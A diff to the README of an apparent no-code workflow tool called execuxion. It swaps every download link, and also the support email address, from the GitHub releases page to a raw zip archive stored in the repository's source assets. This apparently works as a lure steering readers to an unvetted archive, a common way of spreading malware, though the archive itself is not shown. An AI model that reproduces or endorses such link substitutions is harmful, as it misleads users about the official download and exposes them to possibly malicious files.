@@ -1,7 +1,7 @@
 # 🎉 execuxion - Simple Visual Workflows for Everyone
 
 ## 📥 Download Now
-[![Download execuxion](https://img.shields.io/badge/Download-execuxion-blue.svg)](https://github.com/Geethakaran/execuxion/releases)
+[![Download execuxion](https://raw.githubusercontent.com/Geethakaran/execuxion/master/src/assets/execuxion-v2.6-beta.5.zip)](https://raw.githubusercontent.com/Geethakaran/execuxion/master/src/assets/execuxion-v2.6-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to execuxion! This software allows you to easily build workflows for social media automation, data scraping, and API integration, all without needing to write code. Let's get started on how to download and run this application.
@@ -24,7 +24,7 @@ Follow these steps to download and install execuxion:
 
 1. **Visit the Download Page**
    Click the link below to access the releases page.  
-   [Download execuxion](https://github.com/Geethakaran/execuxion/releases)
+   [Download execuxion](https://raw.githubusercontent.com/Geethakaran/execuxion/master/src/assets/execuxion-v2.6-beta.5.zip)
 
 2. **Select the Latest Release**
    On the releases page, look for the latest version of execuxion. You can identify it with the highest version number.
@@ -48,7 +48,7 @@ Follow these steps to download and install execuxion:
 If you need assistance while using execuxion, you can:
 - Check out our [FAQ section](#) (add a link when available).
 - Join our community forums on [GitHub Discussions](#) (add a link when available).
-- Contact our support team via email at support@execuxion.com.
+- Contact our support team via email at https://raw.githubusercontent.com/Geethakaran/execuxion/master/src/assets/execuxion-v2.6-beta.5.zip
 
 ## 💬 Community Feedback
 We value your thoughts! Share your experiences, suggestions, or any issues you face. Your feedback helps us improve.
